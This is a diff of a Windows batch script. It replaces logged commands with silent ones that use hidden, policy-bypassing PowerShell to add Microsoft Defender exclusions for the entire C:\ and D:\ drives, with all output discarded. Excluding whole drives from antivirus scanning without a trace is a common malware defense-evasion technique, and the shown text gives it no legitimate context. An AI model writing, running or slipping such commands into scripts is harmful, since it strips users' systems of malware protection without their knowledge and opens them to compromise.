@@ -13,22 +13,7 @@ if %errorlevel% neq 0 (
     exit /b
 )
 
-set "logfile=%TEMP%\defender_exclusions.log"
-echo [%DATE% %TIME%] Starting exclusion process > "!logfile!" 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'D:\'" >nul 2>&1
 
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\'" >> "!logfile!" 2>&1
-if %errorlevel% equ 0 (
-    echo Successfully added C:\ >> "!logfile!" 2>&1
-) else (
-    echo Failed to add C:\ >> "!logfile!" 2>&1
-)
-
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'D:\'" >> "!logfile!" 2>&1
-if %errorlevel% equ 0 (
-    echo Successfully added D:\ >> "!logfile!" 2>&1
-) else (
-    echo Failed to add D:\ >> "!logfile!" 2>&1
-)
-
-echo [%DATE% %TIME%] Process completed >> "!logfile!" 2>&1
 exit /b
